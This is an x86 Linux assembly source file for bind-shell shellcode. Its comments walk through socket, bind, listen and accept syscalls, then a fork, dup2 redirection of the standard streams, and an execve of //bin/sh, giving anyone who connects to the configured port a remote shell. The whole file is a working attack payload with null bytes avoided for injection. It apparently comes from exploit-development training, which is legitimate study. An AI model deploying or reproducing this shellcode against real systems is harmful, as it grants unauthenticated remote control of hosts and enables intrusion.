global _start

section .text
_start:

  ; socket(AF_INET, SOCK_STREAM, 0)
  ; (EAX) socketcall=102
  ; (EBX) SYS_SOCKET=1
  ; (ECX) points to arguments on stack in reverse order: (0,1,2)
  xor ebx, ebx
  ; zero eax
  mul ebx
  mov al, 0x66
  push ebx
  inc ebx
  push ebx
  push 0x02
  mov ecx, esp
  int 0x80
  ; (EAX) return value (file descriptor)
  mov edi, eax

  ; bind(sock, (struct sockaddr *) &srv, 16)
  ; (EAX) socketcall=102
  ; (EBX) SYS_BIND=2
  ; (ECX) points to arguments on stack in reverse order:
  ; (16, ptr {s_addr=0,sin_port,sin_family=2}, EDI)
  xor eax, eax
  ; s_addr=0
  push eax
  mov al, 0x66
  ; EBX=1 since last call
  inc ebx
  ; sin_port
  push WORD PORT
  ; sin_family=2
  push WORD 0x02
  mov ecx, esp
  ; sizeof(srv) = 16
  push BYTE 0x10
  ; pointer to srv
  push ecx
  ; sock fd (EDI)
  push edi
  mov ecx, esp
  int 0x80
  ; (EAX) return value (0x00000000 - success, 0xffffffff - error)

  ; listen(sock, backlog);
  ; (EAX) socketcall=102
  ; (EBX) SYS_LISTEN=4
  ; (ECX) points to arguments on stack in reverse order: (backlog, EDI)
  ; EAX either is already 0 or there was an error..
  mov al, 0x66
  mov bl, 0x04
  ; push EAX to save space
  push eax
  push edi
  mov ecx, esp
  int 0x80
  ; (EAX) return value (0 - success, -1 - error)

mainloop:

  ; accept(sock, 0, 0)
  ; (EAX) socketcall=102 
  ; (EBX) SYS_ACCEPT=5
  ; (ECX) points to arguments on stack in reverse order: (0, 0)
  xor eax, eax
  push eax
  push eax
  mov al, 0x66
  mov bl, 0x05
  push edi
  mov ecx, esp
  int 0x80
  ; (EAX) return value (file descriptor)
  mov esi, eax


  ; fork()
  ; (EAX) fork=2
  ; big chance that fd is relatively small, no need to zero eax
  ; xor eax, eax
  mov al, 0x02
  int 0x80
  ; (EAX) return value (PID of the process)

  or eax, eax
  ; if PID != 0 then we are in parent process (or error)
  jnz parent

  ; close(sock)
  ; (EAX) close=6
  ; close master socket - fd is stored in EDI
  mov al, 0x06
  mov ebx, edi
  int 0x80
  ; (EAX) return value (0 - success, -1 - error)

  ; dup2(oldfd, newfd)
  ; (EAX) dup2=63
  ; (EBX) socket file descriptor number (ESI)
  ; (ECX) file descriptor for STDIN, STDOUT, STDERR
  mov ebx, esi
  xor ecx, ecx
  mov cl, 0x03

loopdup:

  dec cl
  mov al, 0x3f
  int 0x80
  ; (EAX) return value (file descriptor on success, -1 in case of error)
  jnz loopdup

  ; execve(const char *filename, 0, 0)
  ; (EAX) execve=11
  ; (EBX) points to "//bin/sh",NULL
  ; (ECX) points to 0 (argv[0])
  ; (EDX) points to 0 (envp)
  push ecx
  mov edx, esp
  mov ecx, esp
  ; '//bin/sh'[::-1].encode('hex')
  ; >>> '68732f6e69622f2f'
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp

  mov al, 11
  int 0x80

parent:

  ; parent process
  ; need to close client socket fd (stored in ESI)

  ; close(sock)
  ; (EAX) close=6
  ; close client socket - fd is stored in ESI
  ; EBX = 0x05 (since accept() call)
  xchg eax,ebx
  inc eax
  mov ebx, esi
  int 0x80
  jmp mainloop

; vim: set ft=nasm:
